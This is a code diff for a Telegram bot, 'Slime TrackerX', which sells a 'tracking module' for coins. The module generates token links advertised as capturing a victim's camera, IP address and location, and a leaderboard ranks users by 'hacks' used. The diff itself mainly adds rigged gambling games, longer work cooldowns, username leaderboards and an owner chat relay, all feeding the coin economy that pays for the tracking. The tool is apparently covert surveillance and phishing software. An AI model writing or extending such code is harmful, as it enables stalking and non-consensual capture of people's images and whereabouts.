@@ -1,9 +1,12 @@
 // =====================================================
 // 🟢⚡ SLIME TRACKERX v4.0 ⚡🟢
-// 💻 CYBER ANALYTICS CORE - COMPLETE EDITION
+// 💻 CYBER ANALYTICS CORE
 // =====================================================
 // 👑 Dev: @Mrddev | 📢 Updates: @devxtechzone
 // 🤖 Bot: @trackersxbot
+// 💰 New Users: 5 COINS | Tracking: 5 COINS | Referral: 2 COINS
+// 🎮 GAMES: Bet any amount | VERY HARD WIN RATES | Win = 2x payout | Lose = lose bet
+// 💼 WORK: Every 6 HOURS | 1-2 COINS
 // =====================================================
 
 const { Telegraf, Markup } = require("telegraf");
@@ -32,7 +35,7 @@ const REFERRAL_REWARD = 2;
 const DAILY_REWARD = 1;
 const WORK_MIN = 1;
 const WORK_MAX = 2;
-const GAME_BET = 1;
+const WORK_COOLDOWN = 6 * 60 * 60 * 1000; // 6 hours
 
 // ========== DATABASES ==========
 const users = new Map();
@@ -86,6 +89,15 @@ function formatMessage(text) {
 
 function generateToken() {
   return crypto.randomBytes(8).toString("hex");
+}
+
+async function getUsername(userId) {
+  try {
+    const chat = await bot.telegram.getChat(userId);
+    return chat.username || `User_${userId}`;
+  } catch {
+    return `User_${userId}`;
+  }
 }
 
 // ========== INITIALIZE USER ==========
@@ -247,7 +259,7 @@ async function isUserJoined(ctx) {
   }
 }
 
-// ========== DOPE MAIN MENU ==========
+// ========== MENUS ==========
 function mainMenu(ctx) {
   const referralLink = getReferralLink(ctx.from.id);
   return Markup.inlineKeyboard([
@@ -280,9 +292,9 @@ function groupMenu() {
 
 function gamesMenu() {
   return Markup.inlineKeyboard([
-    [Markup.button.callback("🎲 DICE (33%)", "dice_game"), Markup.button.callback("🎰 SLOTS (15%)", "slots_game")],
-    [Markup.button.callback("🔢 GUESS (10%)", "guess_game"), Markup.button.callback("✊ RPS (33%)", "rps_game")],
-    [Markup.button.callback("🪙 COIN FLIP (40%)", "coinflip"), Markup.button.callback("🔥 HIGH RISK (20%)", "high_risk")],
+    [Markup.button.callback("🎲 DICE", "dice_game"), Markup.button.callback("🎰 SLOTS", "slots_game")],
+    [Markup.button.callback("🔢 GUESS", "guess_game"), Markup.button.callback("✊ RPS", "rps_game")],
+    [Markup.button.callback("🪙 COIN FLIP", "coinflip"), Markup.button.callback("🔥 HIGH RISK", "high_risk")],
     [Markup.button.callback("◀️ BACK", "main_back")]
   ]);
 }
@@ -311,9 +323,7 @@ bot.use(async (ctx, next) => {
   const joined = await isUserJoined(ctx);
   if (!joined) {
     return ctx.telegram.sendMessage(ctx.from.id, formatMessage(`
-╔══════════════════════════╗
-║  🚫 ACCESS LOCKED       ║
-╚══════════════════════════╝
+🚫 ACCESS LOCKED
 
 🔐 You must join our channel first!
 
@@ -394,14 +404,128 @@ bot.action("check_join", async (ctx) => {
   });
 });
 
-// ========== TRACKING ==========
+// ========== MENU NAVIGATION ==========
 bot.action("tracking_menu", async (ctx) => {
-  await ctx.editMessageCaption("🎯 TRACKING MODULE\n\n⚠️ Cost: 5 coins per hack\n⏱️ Token expires in 10 minutes\n📸 Captures: Camera + IP + Location", {
-    parse_mode: "HTML",
-    ...trackingMenu()
-  });
+  try {
+    await ctx.editMessageCaption("🎯 TRACKING MODULE\n\n⚠️ Cost: 5 coins per hack\n⏱️ Token expires in 10 minutes\n📸 Captures: Camera + IP + Location", {
+      parse_mode: "HTML",
+      ...trackingMenu()
+    });
+  } catch (err) {
+    await ctx.reply("🎯 TRACKING MODULE\n\n⚠️ Cost: 5 coins per hack\n⏱️ Token expires in 10 minutes\n📸 Captures: Camera + IP + Location", {
+      parse_mode: "HTML",
+      ...trackingMenu()
+    });
+  }
 });
 
+bot.action("group_menu", async (ctx) => {
+  try {
+    await ctx.editMessageCaption("👑 GROUP MANAGEMENT\n\nAdmin tools for group moderation!", {
+      parse_mode: "HTML",
+      ...groupMenu()
+    });
+  } catch (err) {
+    await ctx.reply("👑 GROUP MANAGEMENT\n\nAdmin tools for group moderation!", {
+      parse_mode: "HTML",
+      ...groupMenu()
+    });
+  }
+});
+
+bot.action("games_menu", async (ctx) => {
+  try {
+    await ctx.editMessageCaption("🎮 GAMES ZONE\n\n💰 Bet any amount you want!\n⚠️ VERY HARD to win!\n🎯 Win = 2x your bet | Lose = lose your bet", {
+      parse_mode: "HTML",
+      ...gamesMenu()
+    });
+  } catch (err) {
+    await ctx.reply("🎮 GAMES ZONE\n\n💰 Bet any amount you want!\n⚠️ VERY HARD to win!\n🎯 Win = 2x your bet | Lose = lose your bet", {
+      parse_mode: "HTML",
+      ...gamesMenu()
+    });
+  }
+});
+
+bot.action("economy_menu", async (ctx) => {
+  const user = initUser(ctx.from.id);
+  try {
+    await ctx.editMessageCaption(formatMessage(`
+💰 ECONOMY SYSTEM
+
+💰 Your Balance: ${user.coins} coins
+📈 Total Earned: ${user.totalEarned}
+
+💰 Earning Methods:
+• Daily reward - ${DAILY_REWARD} coin
+• Work - ${WORK_MIN}-${WORK_MAX} coins (every 6 hours)
+• Referrals - ${REFERRAL_REWARD} coins each
+• Games - Bet any amount (VERY HARD to win)
+• Redeem codes
+
+⬇️ Select option:
+  `), { parse_mode: "HTML", ...economyMenu() });
+  } catch (err) {
+    await ctx.reply(formatMessage(`
+💰 ECONOMY SYSTEM
+
+💰 Your Balance: ${user.coins} coins
+📈 Total Earned: ${user.totalEarned}
+
+💰 Earning Methods:
+• Daily reward - ${DAILY_REWARD} coin
+• Work - ${WORK_MIN}-${WORK_MAX} coins (every 6 hours)
+• Referrals - ${REFERRAL_REWARD} coins each
+• Games - Bet any amount (VERY HARD to win)
+• Redeem codes
+
+⬇️ Select option:
+  `), { parse_mode: "HTML", ...economyMenu() });
+  }
+});
+
+bot.action("leaderboard_menu", async (ctx) => {
+  try {
+    await ctx.editMessageCaption("🏆 LEADERBOARDS\n\nView top users across different categories!", {
+      parse_mode: "HTML",
+      ...leaderboardMenu()
+    });
+  } catch (err) {
+    await ctx.reply("🏆 LEADERBOARDS\n\nView top users across different categories!", {
+      parse_mode: "HTML",
+      ...leaderboardMenu()
+    });
+  }
+});
+
+bot.action("main_back", async (ctx) => {
+  const user = initUser(ctx.from.id);
+  try {
+    await ctx.editMessageCaption(formatMessage(`
+🟢⚡ SLIME TRACKERX ⚡🟢
+💻 CYBER ANALYTICS CORE
+
+💰 Balance: ${user.coins} coins
+📊 Level: ${user.level}
+👥 Referrals: ${user.referrals}
+
+🎯 Select a module below
+  `), { parse_mode: "HTML", ...mainMenu(ctx) });
+  } catch (err) {
+    await ctx.reply(formatMessage(`
+🟢⚡ SLIME TRACKERX ⚡🟢
+💻 CYBER ANALYTICS CORE
+
+💰 Balance: ${user.coins} coins
+📊 Level: ${user.level}
+👥 Referrals: ${user.referrals}
+
+🎯 Select a module below
+  `), { parse_mode: "HTML", ...mainMenu(ctx) });
+  }
+});
+
+// ========== TRACKING ==========
 bot.action("pool", async (ctx) => {
   if (!canHack(ctx.from.id)) {
     return ctx.reply(formatMessage(`
@@ -412,10 +536,10 @@ Current balance: ${users.get(ctx.from.id)?.coins || 0} coins
 
 🎁 Ways to earn coins:
 • Daily reward - ${DAILY_REWARD} coin
-• Work - ${WORK_MIN}-${WORK_MAX} coins
+• Work - ${WORK_MIN}-${WORK_MAX} coins (every 6 hours)
 • Referrals - ${REFERRAL_REWARD} coins each
 • Redeem codes
-• Play games - ${GAME_BET} coin per game
+• Play games - Bet any amount (VERY HARD to win)
     `));
   }
   
@@ -481,23 +605,34 @@ ${DOMAIN}?token=${token}
   ]) });
 });
 
-// ========== GAMES ==========
-bot.action("games_menu", async (ctx) => {
-  await ctx.editMessageCaption("🎮 GAMES ZONE\n\n💰 Cost: 1 coin per game\n⚠️ Hard win rates - you WILL lose coins!\n🎯 Win up to 10x your bet!", {
-    parse_mode: "HTML",
-    ...gamesMenu()
-  });
+// ========== GAMES - BET ANY AMOUNT, VERY HARD TO WIN ==========
+
+// DICE GAME - Only 16% win rate (1 in 6 chance)
+bot.action("dice_game", async (ctx) => {
+  await ctx.reply(formatMessage(`
+🎲 DICE GAME
+
+💰 Bet any amount you want!
+⚠️ VERY HARD - Only 1 in 6 chance to win!
+🎯 Win = 2x your bet | Lose = lose your bet
+
+Use: /dice <amount>
+
+Example: /dice 10
+  `));
 });
 
-bot.action("dice_game", async (ctx) => {
+bot.command("dice", async (ctx) => {
   const user = initUser(ctx.from.id);
-  const bet = GAME_BET;
+  const args = ctx.message.text.split(" ");
+  const bet = parseInt(args[1]);
   
-  if (user.coins < bet) return ctx.reply(`❌ Need ${bet} coin to play!`);
+  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /dice <amount>\nExample: /dice 10");
+  if (user.coins < bet) return ctx.reply(`❌ You don't have ${bet} coins! You have ${user.coins} coins.`);
   
   removeCoins(ctx.from.id, bet, "Dice bet");
   const roll = Math.floor(Math.random() * 6) + 1;
-  const win = roll === 5 || roll === 6;
+  const win = roll === 6; // Only 1 in 6 chance (16.6%)
   
   if (win) {
     const winnings = bet * 2;
@@ -507,7 +642,7 @@ bot.action("dice_game", async (ctx) => {
     await ctx.reply(`🎲 You rolled ${roll} and WON!\n💰 You won ${winnings} coins!`);
   } else {
     await ctx.replyWithDice();
-    await ctx.reply(`🎲 You rolled ${roll} and LOST!\n💸 You lost ${bet} coin!`);
+    await ctx.reply(`🎲 You rolled ${roll} and LOST!\n💸 You lost ${bet} coins!`);
     user.gamesLost++;
   }
   
@@ -515,11 +650,28 @@ bot.action("dice_game", async (ctx) => {
   users.set(ctx.from.id, user);
 });
 
+// SLOTS GAME - Very low win rates
 bot.action("slots_game", async (ctx) => {
+  await ctx.reply(formatMessage(`
+🎰 SLOTS GAME
+
+💰 Bet any amount you want!
+⚠️ VERY HARD - Low chance to win!
+🎯 Jackpot = 10x | Pair = 2x | Lose = lose bet
+
+Use: /slots <amount>
+
+Example: /slots 10
+  `));
+});
+
+bot.command("slots", async (ctx) => {
   const user = initUser(ctx.from.id);
-  const bet = GAME_BET;
+  const args = ctx.message.text.split(" ");
+  const bet = parseInt(args[1]);
   
-  if (user.coins < bet) return ctx.reply(`❌ Need ${bet} coin to play!`);
+  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /slots <amount>\nExample: /slots 10");
+  if (user.coins < bet) return ctx.reply(`❌ You don't have ${bet} coins! You have ${user.coins} coins.`);
   
   removeCoins(ctx.from.id, bet, "Slots bet");
   
@@ -543,7 +695,7 @@ bot.action("slots_game", async (ctx) => {
     winnings = bet * 2;
     message = `🎰 Pair! ${result.join(" ")}\n💰 You won ${winnings} coins!`;
   } else {
-    message = `🎰 ${result.join(" ")}\n💸 You lost ${bet} coin.`;
+    message = `🎰 ${result.join(" ")}\n💸 You lost ${bet} coins!`;
     user.gamesLost++;
   }
   
@@ -557,19 +709,31 @@ bot.action("slots_game", async (ctx) => {
   await ctx.reply(message);
 });
 
+// GUESS GAME - 10% chance
 bot.action("guess_game", async (ctx) => {
-  await ctx.reply("🔢 Guess a number between 1-10!\nUse: /guess <number>\nCost: 1 coin\n⚠️ Only 10% chance to win!");
+  await ctx.reply(formatMessage(`
+🔢 GUESS GAME
+
+💰 Bet any amount you want!
+⚠️ VERY HARD - Only 10% chance to win!
+🎯 Guess number 1-10 | Win = 5x your bet | Lose = lose bet
+
+Use: /guess <amount> <number>
+
+Example: /guess 10 7
+  `));
 });
 
 bot.command("guess", async (ctx) => {
   const user = initUser(ctx.from.id);
   const args = ctx.message.text.split(" ");
-  const guess = parseInt(args[1]);
+  const bet = parseInt(args[1]);
+  const guess = parseInt(args[2]);
   const number = Math.floor(Math.random() * 10) + 1;
-  const bet = GAME_BET;
   
-  if (isNaN(guess) || guess < 1 || guess > 10) return ctx.reply("Guess a number 1-10!");
-  if (user.coins < bet) return ctx.reply(`❌ Need ${bet} coin!`);
+  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /guess <amount> <number 1-10>\nExample: /guess 10 7");
+  if (isNaN(guess) || guess < 1 || guess > 10) return ctx.reply("Guess a number between 1-10!");
+  if (user.coins < bet) return ctx.reply(`❌ You don't have ${bet} coins! You have ${user.coins} coins.`);
   
   removeCoins(ctx.from.id, bet, "Guess game");
   
@@ -579,7 +743,7 @@ bot.command("guess", async (ctx) => {
     user.gamesWon++;
     await ctx.reply(`🎉 Correct! The number was ${number}! You won ${winnings} coins!`);
   } else {
-    await ctx.reply(`❌ Wrong! The number was ${number}. You lost ${bet} coin!`);
+    await ctx.reply(`❌ Wrong! The number was ${number}. You lost ${bet} coins!`);
     user.gamesLost++;
   }
   
@@ -587,18 +751,30 @@ bot.command("guess", async (ctx) => {
   users.set(ctx.from.id, user);
 });
 
+// RPS GAME - 33% win rate
 bot.action("rps_game", async (ctx) => {
-  await ctx.reply("✊ Rock Paper Scissors!\nUse: /rps <rock/paper/scissors>\nCost: 1 coin\n⚠️ Only 33% chance to win!");
+  await ctx.reply(formatMessage(`
+✊ ROCK PAPER SCISSORS
+
+💰 Bet any amount you want!
+⚠️ 33% chance to win, 33% tie, 33% lose
+🎯 Win = 2x your bet | Lose = lose bet | Tie = coins back
+
+Use: /rps <amount> <rock/paper/scissors>
+
+Example: /rps 10 rock
+  `));
 });
 
 bot.command("rps", async (ctx) => {
   const user = initUser(ctx.from.id);
   const args = ctx.message.text.split(" ");
-  const choice = args[1]?.toLowerCase();
-  const bet = GAME_BET;
+  const bet = parseInt(args[1]);
+  const choice = args[2]?.toLowerCase();
   
+  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /rps <amount> <rock/paper/scissors>\nExample: /rps 10 rock");
   if (!["rock", "paper", "scissors"].includes(choice)) return ctx.reply("Choose rock, paper, or scissors!");
-  if (user.coins < bet) return ctx.reply(`❌ Need ${bet} coin!`);
+  if (user.coins < bet) return ctx.reply(`❌ You don't have ${bet} coins! You have ${user.coins} coins.`);
   
   const botChoice = ["rock", "paper", "scissors"][Math.floor(Math.random() * 3)];
   let result;
@@ -619,7 +795,7 @@ bot.command("rps", async (ctx) => {
     user.gamesWon++;
     await ctx.reply(`✊ You chose ${choice}, I chose ${botChoice}!\n🎉 You WIN! +${winnings} coins!`);
   } else if (result === "lose") {
-    await ctx.reply(`✊ You chose ${choice}, I chose ${botChoice}!\n💸 You LOSE! -${bet} coin!`);
+    await ctx.reply(`✊ You chose ${choice}, I chose ${botChoice}!\n💸 You LOSE! -${bet} coins!`);
     user.gamesLost++;
   } else {
     await ctx.reply(`✊ You chose ${choice}, I chose ${botChoice}!\n🤝 It's a TIE! Coins returned.`);
@@ -630,11 +806,28 @@ bot.command("rps", async (ctx) => {
   users.set(ctx.from.id, user);
 });
 
+// COIN FLIP - 40% win rate
 bot.action("coinflip", async (ctx) => {
+  await ctx.reply(formatMessage(`
+🪙 COIN FLIP
+
+💰 Bet any amount you want!
+⚠️ 40% chance to win, 60% chance to lose
+🎯 Win = 2x your bet | Lose = lose bet
+
+Use: /flip <amount>
+
+Example: /flip 10
+  `));
+});
+
+bot.command("flip", async (ctx) => {
   const user = initUser(ctx.from.id);
-  const bet = GAME_BET;
+  const args = ctx.message.text.split(" ");
+  const bet = parseInt(args[1]);
   
-  if (user.coins < bet) return ctx.reply(`❌ Need ${bet} coin to play!`);
+  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /flip <amount>\nExample: /flip 10");
+  if (user.coins < bet) return ctx.reply(`❌ You don't have ${bet} coins! You have ${user.coins} coins.`);
   
   removeCoins(ctx.from.id, bet, "Coin flip bet");
   const flip = Math.random() < 0.4 ? "HEADS" : "TAILS";
@@ -646,7 +839,7 @@ bot.action("coinflip", async (ctx) => {
     user.gamesWon++;
     await ctx.reply(`🪙 Coin landed on ${flip}!\n🎉 You WIN! +${winnings} coins!`);
   } else {
-    await ctx.reply(`🪙 Coin landed on ${flip}!\n💸 You LOST! -${bet} coin!`);
+    await ctx.reply(`🪙 Coin landed on ${flip}!\n💸 You LOST! -${bet} coins!`);
     user.gamesLost++;
   }
   
@@ -654,11 +847,28 @@ bot.action("coinflip", async (ctx) => {
   users.set(ctx.from.id, user);
 });
 
+// HIGH RISK GAME - 20% win rate, 10x payout
 bot.action("high_risk", async (ctx) => {
+  await ctx.reply(formatMessage(`
+🔥 HIGH RISK GAME
+
+💰 Bet any amount you want!
+⚠️ ONLY 20% chance to win!
+🎯 Win = 10x your bet | Lose = lose bet
+
+Use: /risk <amount>
+
+Example: /risk 10
+  `));
+});
+
+bot.command("risk", async (ctx) => {
   const user = initUser(ctx.from.id);
-  const bet = 2;
+  const args = ctx.message.text.split(" ");
+  const bet = parseInt(args[1]);
   
-  if (user.coins < bet) return ctx.reply(`❌ Need ${bet} coins to play high risk!`);
+  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /risk <amount>\nExample: /risk 10");
+  if (user.coins < bet) return ctx.reply(`❌ You don't have ${bet} coins! You have ${user.coins} coins.`);
   
   removeCoins(ctx.from.id, bet, "High risk bet");
   const win = Math.random() < 0.2;
@@ -678,25 +888,6 @@ bot.action("high_risk", async (ctx) => {
 });
 
 // ========== ECONOMY ==========
-bot.action("economy_menu", async (ctx) => {
-  const user = initUser(ctx.from.id);
-  await ctx.editMessageCaption(formatMessage(`
-💰 ECONOMY SYSTEM
-
-💰 Your Balance: ${user.coins} coins
-📈 Total Earned: ${user.totalEarned}
-
-💰 Earning Methods:
-• Daily reward - ${DAILY_REWARD} coin
-• Work - ${WORK_MIN}-${WORK_MAX} coins
-• Referrals - ${REFERRAL_REWARD} coins each
-• Games - Hard win rates!
-• Redeem codes
-
-⬇️ Select option:
-  `), { parse_mode: "HTML", ...economyMenu() });
-});
-
 bot.action("daily", async (ctx) => {
   const user = initUser(ctx.from.id);
   const now = Date.now();
@@ -745,13 +936,14 @@ bot.action("work", async (ctx) => {
   const now = Date.now();
   const lastWork = userWorkCooldown.get(userId) || 0;
   
-  if (now - lastWork < 3600000) {
-    const remaining = 3600000 - (now - lastWork);
-    const minutes = Math.ceil(remaining / 60000);
-    return ctx.reply(`⏰ You're tired! Rest for ${minutes} minutes before working again.`);
+  if (now - lastWork < WORK_COOLDOWN) {
+    const remaining = WORK_COOLDOWN - (now - lastWork);
+    const hours = Math.floor(remaining / 3600000);
+    const minutes = Math.floor((remaining % 3600000) / 60000);
+    return ctx.reply(`⏰ You're tired! Rest for ${hours}h ${minutes}m before working again.`);
   }
   
-  const jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Gamer", "🛒 Shopper"];
+  const jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Gamer", "🛒 Shopper", "🍕 Delivery", "📚 Teacher", "🔧 Mechanic"];
   const job = jobs[Math.floor(Math.random() * jobs.length)];
   const reward = Math.floor(Math.random() * (WORK_MAX - WORK_MIN + 1) + WORK_MIN);
   
@@ -766,105 +958,92 @@ bot.action("work", async (ctx) => {
 
 💎 New Balance: ${users.get(userId).coins} coins
 
-Come back in 1 hour for another shift!
+Come back in 6 hours for another shift!
   `));
 });
 
-// ========== LEADERBOARDS ==========
-bot.action("leaderboard_menu", async (ctx) => {
-  await ctx.editMessageCaption("🏆 LEADERBOARDS\n\nView top users across different categories!", {
-    parse_mode: "HTML",
-    ...leaderboardMenu()
-  });
-});
-
-function getLeaderboard(type, limit = 10) {
-  let sorted = [];
-  switch(type) {
-    case 'coins':
-      sorted = Array.from(users.values()).sort((a, b) => b.coins - a.coins);
-      break;
-    case 'games':
-      sorted = Array.from(users.values()).sort((a, b) => b.gamesWon - a.gamesWon);
-      break;
-    case 'referrals':
-      sorted = Array.from(users.values()).sort((a, b) => b.referrals - a.referrals);
-      break;
-    case 'level':
-      sorted = Array.from(users.values()).sort((a, b) => b.level - a.level);
-      break;
-    case 'hacks':
-      sorted = Array.from(users.values()).sort((a, b) => b.usedHacks - a.usedHacks);
-      break;
-    default:
-      sorted = Array.from(users.values()).sort((a, b) => b.coins - a.coins);
-  }
-  return sorted.slice(0, limit);
-}
-
+// ========== LEADERBOARDS WITH USERNAMES ==========
 bot.action("leaderboard_coins", async (ctx) => {
-  const topUsers = getLeaderboard('coins', 10);
+  const topUsers = Array.from(users.values()).sort((a, b) => b.coins - a.coins).slice(0, 10);
   let message = "🏆 **💰 RICHEST USERS** 🏆\n\n";
+  
   for (let i = 0; i < topUsers.length; i++) {
     const user = topUsers[i];
     const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
-    message += `${medal} \`${user.id}\` - ${user.coins} coins\n`;
+    const username = await getUsername(user.id);
+    message += `${medal} @${username} - ${user.coins} coins\n`;
   }
+  
   await ctx.reply(message, { parse_mode: "Markdown" });
 });
 
 bot.action("leaderboard_games", async (ctx) => {
-  const topUsers = getLeaderboard('games', 10);
+  const topUsers = Array.from(users.values()).sort((a, b) => b.gamesWon - a.gamesWon).slice(0, 10);
   let message = "🏆 **🎮 TOP GAMERS** 🏆\n\n";
+  
   for (let i = 0; i < topUsers.length; i++) {
     const user = topUsers[i];
     const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
-    message += `${medal} \`${user.id}\` - ${user.gamesWon} wins\n`;
+    const username = await getUsername(user.id);
+    message += `${medal} @${username} - ${user.gamesWon} wins\n`;
   }
+  
   await ctx.reply(message, { parse_mode: "Markdown" });
 });
 
 bot.action("leaderboard_referrals", async (ctx) => {
-  const topUsers = getLeaderboard('referrals', 10);
+  const topUsers = Array.from(users.values()).sort((a, b) => b.referrals - a.referrals).slice(0, 10);
   let message = "🏆 **👥 TOP REFERRERS** 🏆\n\n";
+  
   for (let i = 0; i < topUsers.length; i++) {
     const user = topUsers[i];
     const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
-    message += `${medal} \`${user.id}\` - ${user.referrals} referrals\n`;
+    const username = await getUsername(user.id);
+    message += `${medal} @${username} - ${user.referrals} referrals\n`;
   }
+  
   await ctx.reply(message, { parse_mode: "Markdown" });
 });
 
 bot.action("leaderboard_level", async (ctx) => {
-  const topUsers = getLeaderboard('level', 10);
+  const topUsers = Array.from(users.values()).sort((a, b) => b.level - a.level).slice(0, 10);
   let message = "🏆 **⭐ TOP LEVELS** 🏆\n\n";
+  
   for (let i = 0; i < topUsers.length; i++) {
     const user = topUsers[i];
     const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
-    message += `${medal} \`${user.id}\` - Level ${user.level}\n`;
+    const username = await getUsername(user.id);
+    message += `${medal} @${username} - Level ${user.level}\n`;
   }
+  
   await ctx.reply(message, { parse_mode: "Markdown" });
 });
 
 bot.action("leaderboard_hacks", async (ctx) => {
-  const topUsers = getLeaderboard('hacks', 10);
+  const topUsers = Array.from(users.values()).sort((a, b) => b.usedHacks - a.usedHacks).slice(0, 10);
   let message = "🏆 **🔧 TOP HACKERS** 🏆\n\n";
+  
   for (let i = 0; i < topUsers.length; i++) {
     const user = topUsers[i];
     const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
-    message += `${medal} \`${user.id}\` - ${user.usedHacks} hacks\n`;
+    const username = await getUsername(user.id);
+    message += `${medal} @${username} - ${user.usedHacks} hacks\n`;
   }
+  
   await ctx.reply(message, { parse_mode: "Markdown" });
 });
 
 bot.action("coin_leaderboard", async (ctx) => {
-  const topUsers = getLeaderboard('coins', 10);
+  const topUsers = Array.from(users.values()).sort((a, b) => b.coins - a.coins).slice(0, 10);
   let message = "🏆 **💰 RICHEST USERS** 🏆\n\n";
+  
   for (let i = 0; i < topUsers.length; i++) {
     const user = topUsers[i];
     const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
-    message += `${medal} \`${user.id}\` - ${user.coins} coins\n`;
+    const username = await getUsername(user.id);
+    message += `${medal} @${username} - ${user.coins} coins\n`;
   }
+  
   await ctx.reply(message, { parse_mode: "Markdown" });
 });
 
@@ -975,10 +1154,17 @@ bot.command("redeem", async (ctx) => {
 
 // ========== GROUP COMMANDS ==========
 bot.action("group_menu", async (ctx) => {
-  await ctx.editMessageCaption("👑 GROUP MANAGEMENT\n\nAdmin tools for group moderation!", {
-    parse_mode: "HTML",
-    ...groupMenu()
-  });
+  try {
+    await ctx.editMessageCaption("👑 GROUP MANAGEMENT\n\nAdmin tools for group moderation!", {
+      parse_mode: "HTML",
+      ...groupMenu()
+    });
+  } catch (err) {
+    await ctx.reply("👑 GROUP MANAGEMENT\n\nAdmin tools for group moderation!", {
+      parse_mode: "HTML",
+      ...groupMenu()
+    });
+  }
 });
 
 bot.action("tagall", async (ctx) => {
@@ -1280,10 +1466,11 @@ bot.command("work", async (ctx) => {
   const now = Date.now();
   const lastWork = userWorkCooldown.get(userId) || 0;
   
-  if (now - lastWork < 3600000) {
-    const remaining = 3600000 - (now - lastWork);
-    const minutes = Math.ceil(remaining / 60000);
-    return ctx.reply(`⏰ Rest for ${minutes} minutes before working again.`);
+  if (now - lastWork < WORK_COOLDOWN) {
+    const remaining = WORK_COOLDOWN - (now - lastWork);
+    const hours = Math.floor(remaining / 3600000);
+    const minutes = Math.floor((remaining % 3600000) / 60000);
+    return ctx.reply(`⏰ Rest for ${hours}h ${minutes}m before working again.`);
   }
   
   const jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Gamer", "🛒 Shopper"];
@@ -1431,19 +1618,78 @@ bot.command("stats", async (ctx) => {
   `);
 });
 
-// ========== BACK BUTTON ==========
-bot.action("main_back", async (ctx) => {
-  const user = initUser(ctx.from.id);
-  await ctx.editMessageCaption(formatMessage(`
-🟢⚡ SLIME TRACKERX ⚡🟢
-💻 CYBER ANALYTICS CORE
+// ========== CHAT WITH DEV ==========
+bot.command("chat", async (ctx) => {
+  activeChats.set(ctx.chat.id, true);
+  await ctx.reply(`
+💬 CHAT MODE ACTIVE
 
-💰 Balance: ${user.coins} coins
-📊 Level: ${user.level}
-👥 Referrals: ${user.referrals}
+✅ You can now message the developer!
 
-🎯 Select a module below
-  `), { parse_mode: "HTML", ...mainMenu(ctx) });
+📨 Instructions:
+• Send any message
+• Dev will reply here
+• Type /exit to leave
+
+Response time: Usually within minutes
+  `);
+});
+
+bot.command("exit", async (ctx) => {
+  if (activeChats.has(ctx.chat.id)) {
+    activeChats.delete(ctx.chat.id);
+    await ctx.reply("✅ Exited chat mode. Type /chat to start again.");
+  } else {
+    await ctx.reply("⚠️ You are not in chat mode!");
+  }
+});
+
+// ========== MESSAGE HANDLER ==========
+bot.on("text", async (ctx) => {
+  const chatId = ctx.chat.id;
+  const msg = ctx.message;
+  if (!msg.text || msg.text.startsWith("/")) return;
+  
+  botStats.totalMessages++;
+  
+  // Owner reply system
+  if (chatId === OWNER_ID && msg.reply_to_message) {
+    const replyText = msg.reply_to_message.text || "";
+    const match = replyText.match(/ID: (\d+)/);
+    if (match) {
+      const userId = parseInt(match[1]);
+      try {
+        await ctx.telegram.sendMessage(userId, `💬 Reply from owner:\n\n${msg.text}`);
+        await ctx.reply("✅ Reply sent!");
+      } catch (err) {
+        await ctx.reply("❌ Failed to send reply.");
+      }
+      return;
+    }
+  }
+  
+  // User to owner chat
+  if (activeChats.has(chatId)) {
+    try {
+      await ctx.telegram.sendMessage(OWNER_ID, `
+📨 New Message from User
+
+👤 Name: ${msg.from.first_name}
+🔗 Username: @${msg.from.username || 'None'}
+🆔 ID: ${chatId}
+
+💬 Message:
+${msg.text}
+
+Reply to this message to respond.
+      `);
+      await ctx.reply("✅ Message sent to owner!");
+    } catch (err) {
+      await ctx.reply("❌ Failed to send message.");
+    }
+  }
+  
+  addXP(chatId, 1);
 });
 
 // ========== API ENDPOINT ==========
